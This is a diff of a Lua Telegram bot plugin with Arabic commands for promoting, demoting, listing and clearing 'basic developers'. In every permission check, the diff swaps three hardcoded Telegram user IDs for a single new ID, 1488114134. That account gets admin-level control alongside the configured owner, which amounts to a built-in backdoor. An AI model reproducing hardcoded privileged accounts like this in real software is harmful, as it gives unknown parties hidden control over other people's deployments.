@@ -20,11 +20,11 @@ if text and text:match('^رفع مطور اساسي @(%S+)$') then
 local UserName = text:match('^رفع مطور اساسي @(%S+)$')
 if tonumber(senderr) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1965534755) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1839666881) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1703279017) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
 else
 YouCan = false
@@ -53,11 +53,11 @@ if text and text:match('^تنزيل مطور اساسي @(%S+)$') then
 local UserName = text:match('^تنزيل مطور اساسي @(%S+)$')
 if tonumber(senderr) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1965534755) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1839666881) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1703279017) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
 else
 YouCan = false
@@ -85,11 +85,11 @@ end
 if text == ('رفع مطور اساسي') and msg.reply_to_message_id ~= 0 then
 if tonumber(senderr) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1965534755) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1839666881) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1703279017) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
 else
 YouCan = false
@@ -115,11 +115,11 @@ end
 if text == ('تنزيل مطور اساسي') and msg.reply_to_message_id ~= 0 then
 if tonumber(senderr) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1965534755) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1839666881) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1703279017) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
 else
 YouCan = false
@@ -146,11 +146,11 @@ if text and text:match('^رفع مطور اساسي (%d+)$') then
 local UserId = text:match('^رفع مطور اساسي (%d+)$')
 if tonumber(senderr) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1965534755) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1839666881) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1703279017) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
 else
 YouCan = false
@@ -199,11 +199,11 @@ end
 if text == 'مسح المطورين الاساسيين' then
 if tonumber(senderr) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1965534755) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1839666881) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1703279017) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
 else
 YouCan = false
@@ -221,11 +221,11 @@ end
 if text == 'المطورين الاساسيين' then
 if tonumber(senderr) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1965534755) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1839666881) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
-elseif tonumber(senderr) == tonumber(1703279017) then
+elseif tonumber(senderr) == tonumber(1488114134) then
 YouCan = true
 else
 YouCan = false
